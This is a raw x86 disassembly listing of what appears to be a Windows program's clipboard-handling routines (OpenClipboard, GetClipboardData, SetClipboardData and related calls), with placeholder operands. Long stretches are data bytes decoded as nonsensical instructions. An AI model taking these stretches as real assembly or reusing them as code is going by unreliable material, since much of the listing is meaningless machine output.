add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
test [ fs : esi ] 0x15
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
test [ fs : esi ] 0x1d
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
test [ fs : esi ] 0x5
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
test [ fs : esi ] 0xd
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add al dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] bl
fld [ esi ]
push 0x100042c0
fld [ esi ]
pushad
rol [ edx ] 0x8
fld [ esi ]
pop eax
rol [ edx ] 0x0
fld [ esi ]
push eax
rol [ edx ] 0xf8
fadd [ esi ]
dec eax
rol [ edx ] 0xf0
fadd [ esi ]
inc eax
rol [ edx ] 0xe8
fadd [ esi ]
cmp al al
inc edx
add al ah
fadd [ esi ]
xor al al
inc edx
add al bl
fadd [ esi ]
sub al al
inc edx
add al dl
fadd [ esi ]
and al al
inc edx
add al cl
fadd [ esi ]
sbb al al
inc edx
add al al
fadd [ esi ]
adc al al
inc edx
add [ eax + 0x80046d8 ] bh
rol [ edx ] 0xb0
fadd [ esi ]
add al al
inc edx
add [ eax - 0x7ffb928 ] ch
mov edi 0xd8a00042
inc esi
add al dh
mov edi 0xd8980042
inc esi
add al ch
mov edi 0xd8900042
inc esi
add al ah
mov edi 0xd8880042
inc esi
add al bl
mov edi 0xd8800042
inc esi
add al dl
mov edi 0xd8780042
inc esi
add al cl
mov edi 0xd8700042
inc esi
add al al
mov edi 0xd8680042
inc esi
add [ eax + 0x600042bf ] bh
fadd [ esi ]
mov al 0xbf
inc edx
add [ eax - 0x28 ] bl
fadd [ esi ]
cwde
mov edi 0xd8400042
inc esi
add [ eax + 0x380042bf ] dl
fadd [ esi ]
mov [ edi - 0x27cfffbe ] bh
inc esi
add [ eax + 0x280042bf ] al
fadd [ esi ]
js r-xdata
mov edi 0xd8600042
inc esi
add [ eax + 0x580042bf ] dh
fadd [ esi ]
test al 0xbf
inc edx
add [ eax - 0x28 ] dl
inc esi
add [ eax + 0x480042bf ] ah
inc edx
add [ eax ] ah
fadd [ esi ]
jo r-xdata
inc esi
add [ eax + 0x500042bf ] ch
fadd [ esi ]
mov al [ 0x480042bf ]
mov edi 0xd8580042
inc edx
add [ eax ] bl
fadd [ esi ]
push 0x100042bf
fadd [ esi ]
pushad
mov edi 0xd8080042
inc esi
add [ eax - 0x41 ] bl
inc edx
add [ eax ] al
fadd [ esi ]
push eax
mov edi 0xd7f80042
inc esi
add [ eax - 0x41 ] cl
inc edx
add al dh
xlat
inc esi
add [ eax - 0x41 ] al
inc edx
add al ch
xlat
inc esi
add [ eax ] bh
mov edi 0xd7e00042
inc esi
add [ eax ] dh
mov edi 0xd7d80042
inc esi
add [ eax ] ch
mov edi 0xd7d00042
inc esi
add [ eax ] ah
mov edi 0xd7c80042
inc esi
add [ eax ] bl
mov edi 0xd7c00042
inc esi
add [ eax ] dl
mov edi 0xd7b80042
inc esi
add [ eax ] cl
mov edi 0xd7b00042
inc esi
add [ eax ] al
mov edi 0xd7a80042
inc esi
add al bh
mov esi 0x8b550042
in al dx
xor eax eax
push ebp
push sub_42c228
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c22f
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a44
sub_42c264
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c289
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c290
retn
sub_42c2a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xc3
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 8 ] al
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x17 ] dh
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
jo r-xdata
inc edx
add [ eax ] bh
mov [ edx ] 0x70
inc eax
inc ecx
add [ eax + 0x1c0042c7 ] ch
les eax [ edx ]
xor al 0xc3
inc edx
add [ ebx + eax * 8 - 0x3c3fffbe ] dl
inc edx
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
adc al 0xc3
inc edx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
call 0xffffffffe44305e7
pop ss
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c36c
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c373
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42c394
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41a580
sub_42c3c0
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_42c814
call sub_41a4cc
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_42c41c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42c43c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42c4ae
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403fbc
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_4041b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c4b5
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_42c4bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42c55e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_41f6d4
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41f5e4
call sub_403aa4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c56c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c5c4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5cb
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42c5d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42c629
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c630
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42c638
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42c4bc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42c56c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414068
mov edx ebx
mov eax esi
call sub_42c5d4
jmp r-xdata
pop esi
pop ebx
retn
sub_42c6a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c715
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42c378
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_41f6a8
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c71c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42c724
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42c378
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7a0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42c7a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42c6a0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_413f84
mov edx ebx
mov eax esi
call sub_42c724
jmp r-xdata
pop esi
pop ebx
retn
sub_42c814
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c83e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c843
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403a20
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c870
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413f58
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_42c8a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c8d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c8dc
retn
mov eax [ rw-data ]
call sub_40326c
sub_42c972
inc edx
add [ ebx ] al
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
cmpsb [ esi ] [ edi ]
inc esp
add [ esi + ecx * 8 - 0x33dbffbd ] dh
inc ebx
add [ esi ] dl
push esp
push ebx
jo r-xdata
add [ eax - 0x5b ] ah
inc esp
add [ eax ] al
iretd
inc eax
add al al
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xca
inc edx
add [ eax + eax ] ah
add [ eax ] al
fmul [ ebx + 0x34b40043 ]
jne r-xdata
inc ebx
add [ edi + edi - 0x1813ffbf ] al
inc edx
add [ ebx + edx * 8 - 0x2cffffbd ] dl
inc ebx
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x37 ] dh
inc edx
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc edx
add [ eax ] dl
add [ ebx ] al
add cl [ eax + esi * 4 ]
sbb [ eax - 0x4ff14ffa ] dh
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax - 0x1e ] bl
inc edx
add [ esi + ebp * 8 - 0x116fffbd ] dl
inc ebx
add [ eax - 0x11 ] ah
inc ebx
add [ eax ] cl
rol [ ebx ] cl
dec esp
fld [ ebx ]
mov al 0xd8
inc ebx
add al bl
loope r-xdata
inc ebx
add [ eax ] cl
fwait
je r-xdata
add [ eax + 0x240042ca ] dh
add [ eax ] al
add al bl
mov eax [ ebx ]
mov ah 0x34
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
adc ah ch
inc edx
add [ eax ] dh
in al dx
inc edx
add [ esp + ebp * 8 + 0x42 ] ah
add ah dl
in al dx
inc edx
add [ ebp + ebp * 8 + 0x42 ] ch
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x4c0043f1 ] dl
add al [ eax + eax - 0x68 ]
jecxz r-xdata
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42cb1490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
int3
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
push 0x68676952
je r-xdata
add [ ebp + ebp * 8 + 0x42 ] dh
add [ ebp + ebp * 8 + 0x42 ] bh
add [ eax + 0x140042ed ] ah
insb
in eax dx
inc edx
add [ esp ] cl
inc ebx
add [ eax - 0x13ffbc2c ] al
jecxz r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
out dx al
inc edx
add [ edi + ebp * 8 ] cl
inc edx
add [ edx + ebp * 8 ] ah
inc edx
add [ eax ] dl
0xe8180042 0x42
mov al [ 0x140042ed ]
add [ eax - 0x1d ] dl
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx - 0x1e87ffbf ]
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
inc edx
enter 0x4034 0x0
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add ah bl
fwait
inc ecx
add [ eax - 0x1f ] bh
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add [ eax ] ch
into
inc ebx
add [ esp + ebx * 4 + 0x41 ] al
add ah dl
into
inc ebx
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
je r-xdata
add [ eax ] dl
pushfd
outsb
jae r-xdata
adc [ eax + 0x64 ] ch
leave
inc edx
add bl al
jmp sub_4039c0
rcl al 0xc9
inc edx
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ ecx * 8 - 0x1e63ffbd ] dl
inc edx
add [ eax - 0x17ffbc33 ] cl
loope r-xdata
inc ecx
add [ eax ] ch
pushfd
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
xor al 0xca
inc edx
sub_42cbc4
jmp r-xdata
call [ eax ]
in al dx
inc edx
add [ eax ] dh
in al dx
inc edx
add [ esp + ebp * 8 + 0x42 ] ah
add ah dl
in al dx
inc edx
add [ ebp + ebp * 8 + 0x42 ] ch
add [ ebp + ebp * 8 + 0x42 ] dh
add [ ebp + ebp * 8 + 0x42 ] bh
add [ eax + 0x140042ed ] ah
out dx al
inc edx
add [ edi + ebp * 8 ] cl
inc edx
add [ edx + ebp * 8 ] ah
inc edx
add [ eax ] dl
0xe8180042 0x42
sub_42cc66
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
jae r-xdata
mov es [ ebx ]
popad
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ fs : eax ] al
jb r-xdata
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
mov es [ ebx ]
je r-xdata
cmovno eax [ eax ]
pop edi
add [ eax ] al
push [ eax ]
add [ eax ] eax
dec eax
0x10042 0x0
xchg esp eax
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
push esp
jmp r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
cld
jmp r-xdata
add [ eax ] ah
and eax 0x3c0041
add dh bh
cmp dl dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
popad
jo r-xdata
fiadd [ ebx ]
or al 0xff
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
add bh bh
jo r-xdata
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push r-xdata
jae r-xdata
add dh bh
call sub_431092
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ eax - 0x15 ]
add bh bh
push 0x10042eb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ eax ] al
jmp esp
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx + 0x38ff0000 ] bl
loopne r-xdata
jne r-xdata
add [ eax ] eax
inc eax
jmp r-xdata
outsb
add al 0x0
add [ eax ] al
pop ds
add [ edi ] al
push ebx
jo r-xdata
outsb
je r-xdata
adc [ eax ] al
0x38ff0000 0x43e0
dec ebp
outsd
or al 0xd5
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
inc [ ebx + ebp * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb [ eax ] al
push es
dec ebp
popad
jb r-xdata
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
cdq
add [ eax ] al
call [ eax ]
inc ebx
add ah bl
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
shr bl 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ eax + eax ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
aad 0x44
push 0x6948776f
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
popad
jb r-xdata
imul ebp [ esi - 0x34 ] 0x500042c9
0xea5c0042 0x42
push esp
jb r-xdata
adc [ eax ] al
inc edx
add [ eax - 0x74000000 ] cl
cmpsb [ esi ] [ edi ]
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
push 0x6948776f
outsb
je r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
jmp [ ebx + ebp * 8 + 0x10042 ]
add bh bh
movsb [ edi ] [ esi ]
jmp r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffbd30 ] ch
add [ eax ] al
add [ esi - 0x650fffbd ] cl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
inc edx
add [ esi + edi * 4 ] dh
inc esp
add [ ecx + eax * 8 - 0x428bffbc ] bh
inc esp
add al dl
xchg edi eax
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
cld
pop [ ebx ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
je r-xdata
outsb
adc [ eax ] al
push edi
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add ah bh
push 0x7473694c
nop
mov eax 0x70042d0
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
loopne r-xdata
dec ebp
outsd
jbe r-xdata
arpl bp di
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
